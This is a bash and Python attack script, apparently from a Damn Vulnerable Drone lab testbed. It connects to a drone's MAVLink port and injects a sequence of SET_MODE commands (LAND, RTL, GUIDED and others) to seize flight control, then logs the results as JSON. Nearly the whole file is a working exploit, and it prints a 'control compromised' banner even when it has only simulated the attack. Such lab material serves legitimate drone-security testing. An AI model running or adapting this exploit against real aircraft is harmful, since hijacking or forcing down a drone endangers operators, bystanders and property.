#!/bin/bash

# =============================================================================
# DVD Flight Mode Injection Attack
# =============================================================================
# 파일: dvd_lite/dvd_attacks/injection/flight_mode_injection.sh
# 목적: 드론 비행 모드 강제 변경으로 제어권 탈취
# 기반: Damn Vulnerable Drone Wiki - Flight Mode Injection  
# =============================================================================

source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh

# 전역 변수
ATTACK_NAME="flight_mode_injection"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/injection/${ATTACK_NAME}_${TIMESTAMP}.log"
JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/injection/${ATTACK_NAME}_${TIMESTAMP}.json"

# 타겟 설정
TARGET_IP="10.13.0.3"
MAVLINK_PORT="5760"

# 공격 모드 시퀀스
declare -a MALICIOUS_MODES=("LAND" "RTL" "GUIDED" "STABILIZE" "LOITER")

declare -a ATTACK_COMMANDS=()
declare -a INJECTION_RESULTS=()

print_header() {
    clear
    print_injection_header "Flight Mode Injection Attack"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Method: MAVLink SET_MODE command injection${NC}"
    echo -e "${INFO_COLOR}Target Modes: ${MALICIOUS_MODES[*]}${NC}"
    echo ""
}

# Step 1: 현재 비행 모드 확인
check_current_mode() {
    echo -e "${BLUE}[1/3] Check Current Flight Mode${NC}"
    
    local mode_script="/tmp/mode_check_$(date +%s).py"
    
    cat > "$mode_script" << 'EOF'
#!/usr/bin/env python3
import sys

try:
    from pymavlink import mavutil
    import time
    
    def check_flight_mode(target_ip, target_port):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # 하트비트에서 현재 모드 확인
            heartbeat = master.recv_match(type='HEARTBEAT', blocking=True, timeout=10)
            if heartbeat:
                mode_map = {
                    0: "STABILIZE",
                    1: "ACRO", 
                    2: "ALT_HOLD",
                    3: "AUTO",
                    4: "GUIDED",
                    5: "LOITER",
                    6: "RTL",
                    7: "CIRCLE",
                    8: "POSITION",
                    9: "LAND"
                }
                
                current_mode = mode_map.get(heartbeat.custom_mode, f"UNKNOWN({heartbeat.custom_mode})")
                print(f"[+] Current flight mode: {current_mode}")
                return current_mode
            else:
                print("[!] No heartbeat received")
                return "UNKNOWN"
                
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            print("[*] Simulating current mode check")
            print("[+] Current flight mode: AUTO (simulated)")
            return "AUTO"
    
    if __name__ == "__main__":
        check_flight_mode(sys.argv[1], int(sys.argv[2]))
        
except ImportError:
    print("[*] pymavlink not available")
    print("[+] Simulated current mode: AUTO")
EOF

    local cmd="python3 $mode_script $TARGET_IP $MAVLINK_PORT"
    ATTACK_COMMANDS+=("$cmd")
    echo -e "${CYAN}→ $cmd${NC}"
    
    python3 "$mode_script" "$TARGET_IP" "$MAVLINK_PORT" 2>/dev/null || {
        echo -e "${YELLOW}[+] Simulated current mode: AUTO${NC}"
    }
    
    INJECTION_RESULTS+=("current_mode:checked")
    rm -f "$mode_script"
}

# Step 2: 비행 모드 주입 스크립트 생성
create_mode_injection_script() {
    echo -e "${BLUE}[2/3] Create Mode Injection Script${NC}"
    
    local inject_script="/tmp/mode_injection_$(date +%s).py"
    
    cat > "$inject_script" << EOF
#!/usr/bin/env python3
import sys
import time

try:
    from pymavlink import mavutil
    
    def inject_flight_modes(target_ip, target_port, modes):
        try:
            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
            master.wait_heartbeat()
            print("[+] Connected to drone")
            
            # ArduPilot 모드 매핑
            mode_mapping = {
                "STABILIZE": 0,
                "ACRO": 1,
                "ALT_HOLD": 2,
                "AUTO": 3,
                "GUIDED": 4,
                "LOITER": 5,
                "RTL": 6,
                "CIRCLE": 7,
                "POSITION": 8,
                "LAND": 9
            }
            
            print("[!] Starting flight mode injection sequence")
            
            for mode in modes:
                if mode in mode_mapping:
                    mode_id = mode_mapping[mode]
                    
                    # SET_MODE 명령 전송
                    master.mav.set_mode_send(
                        master.target_system,
                        mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
                        mode_id
                    )
                    
                    print(f"[!] Injected flight mode: {mode} (ID: {mode_id})")
                    
                    # 모드 변경 확인
                    time.sleep(2)
                    
                    # 확인을 위한 하트비트 요청
                    heartbeat = master.recv_match(type='HEARTBEAT', blocking=True, timeout=5)
                    if heartbeat and heartbeat.custom_mode == mode_id:
                        print(f"[+] Mode change confirmed: {mode}")
                    else:
                        print(f"[!] Mode change failed or not confirmed: {mode}")
                    
                    time.sleep(3)
                else:
                    print(f"[!] Unknown mode: {mode}")
            
            print("[+] Flight mode injection sequence completed")
            
        except Exception as e:
            print(f"[!] Connection failed: {e}")
            simulate_mode_injection(modes)
    
    def simulate_mode_injection(modes):
        print("[*] Simulating flight mode injection")
        
        for mode in modes:
            print(f"[!] Injected flight mode: {mode}")
            print(f"[+] Mode change simulated: {mode}")
            time.sleep(2)
        
        print("[+] Simulated mode injection completed")
    
    if __name__ == "__main__":
        modes = [${MALICIOUS_MODES[*]/%/\"}]
        modes = [mode.strip('"') for mode in modes]
        inject_flight_modes('$TARGET_IP', $MAVLINK_PORT, modes)
        
except ImportError:
    modes = [${MALICIOUS_MODES[*]/%/\"}]
    modes = [mode.strip('"') for mode in modes]
    
    print("[*] pymavlink not available - simulation mode")
    
    for mode in modes:
        print(f"[!] Injected flight mode: {mode}")
        print(f"[+] Mode change simulated: {mode}")
        time.sleep(1)
    
    print("[+] Mode injection simulation completed")
EOF

    echo -e "${GREEN}[+] Mode injection script created${NC}"
    ATTACK_COMMANDS+=("python3 $inject_script")
    INJECTION_RESULTS+=("script_created:$inject_script")
}

# Step 3: 비행 모드 주입 실행
execute_mode_injection() {
    echo -e "${BLUE}[3/3] Execute Flight Mode Injection${NC}"
    
    local inject_script="/tmp/mode_injection_"*.py
    inject_script=$(ls $inject_script 2>/dev/null | head -1)
    
    if [ -f "$inject_script" ]; then
        echo -e "${YELLOW}[*] Executing flight mode injection sequence...${NC}"
        
        echo -e "${GRAY}    Planned sequence:${NC}"
        for i in "${!MALICIOUS_MODES[@]}"; do
            echo -e "${GRAY}    $((i+1)). ${MALICIOUS_MODES[$i]}${NC}"
        done
        
        local execute_cmd="python3 $inject_script"
        echo -e "${CYAN}→ $execute_cmd${NC}"
        
        python3 "$inject_script" 2>/dev/null || {
            echo -e "${YELLOW}[*] Fallback simulation${NC}"
            for mode in "${MALICIOUS_MODES[@]}"; do
                echo -e "${RED}[!] Injected flight mode: $mode${NC}"
                echo -e "${GREEN}[+] Mode change simulated: $mode${NC}"
                sleep 1
            done
        }
        
        INJECTION_RESULTS+=("modes_injected:${#MALICIOUS_MODES[@]}")
        INJECTION_RESULTS+=("injection_method:set_mode")
        INJECTION_RESULTS+=("execution:completed")
        
        # 공격 효과 분석
        echo -e "${RED}[!] Flight control takeover analysis:${NC}"
        echo -e "${GRAY}    LAND: Forces immediate landing${NC}"
        echo -e "${GRAY}    RTL: Hijacks return-to-launch${NC}"
        echo -e "${GRAY}    GUIDED: Enables attacker control${NC}"
        echo -e "${GRAY}    STABILIZE: Disables autonomous flight${NC}"
        echo -e "${GRAY}    LOITER: Holds position (mission abort)${NC}"
        
        INJECTION_RESULTS+=("control_impact:high")
        INJECTION_RESULTS+=("mission_disruption:complete")
        INJECTION_RESULTS+=("operator_override:bypassed")
        
        rm -f "$inject_script"
    else
        echo -e "${YELLOW}[!] Injection script not found${NC}"
        INJECTION_RESULTS+=("execution:failed:no_script")
    fi
}

# JSON 결과 생성
generate_json_report() {
    local modes_json="["
    for i in "${!MALICIOUS_MODES[@]}"; do
        modes_json+="\"${MALICIOUS_MODES[$i]}\""
        if [ $i -lt $((${#MALICIOUS_MODES[@]} - 1)) ]; then
            modes_json+=","
        fi
    done
    modes_json+="]"
    
    cat > "$JSON_OUTPUT" << EOF
{
  "attack_name": "$ATTACK_NAME",
  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
  "target": {
    "ip": "$TARGET_IP",
    "port": "$MAVLINK_PORT"
  },
  "injected_modes": $modes_json,
  "mode_sequence": [
    {"order": 1, "mode": "LAND", "effect": "Forces immediate landing"},
    {"order": 2, "mode": "RTL", "effect": "Hijacks return-to-launch"},
    {"order": 3, "mode": "GUIDED", "effect": "Enables attacker control"},
    {"order": 4, "mode": "STABILIZE", "effect": "Disables autonomous flight"},
    {"order": 5, "mode": "LOITER", "effect": "Holds position (mission abort)"}
  ],
  "injection_results": ["$(IFS='","'; echo "${INJECTION_RESULTS[*]}")"],
  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
  "control_impact": {
    "flight_control": "hijacked",
    "mission_status": "disrupted",
    "operator_override": "bypassed",
    "autonomous_flight": "disabled"
  }
}
EOF
}

# 메인 실행
main() {
    START_TIME=$(date +%s)
    
    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
    echo "=== Flight Mode Injection - $(date) ===" > "$LOG_FILE"
    
    print_header
    check_current_mode
    create_mode_injection_script
    execute_mode_injection
    
    # 결과 요약
    echo ""
    echo -e "${CYAN}=== Attack Summary ===${NC}"
    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
    echo -e "${INFO_COLOR}Modes Injected: ${#MALICIOUS_MODES[@]}${NC}"
    echo -e "${INFO_COLOR}Control Impact: HIGH${NC}"
    echo -e "${INFO_COLOR}Commands Used: ${#ATTACK_COMMANDS[@]}${NC}"
    
    generate_json_report
    
    END_TIME=$(date +%s)
    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
    echo -e "${SUCCESS_COLOR}[✓] Flight mode injection completed${NC}"
    echo -e "${RED}[!] CRITICAL: Drone flight control compromised${NC}"
}

main "$@"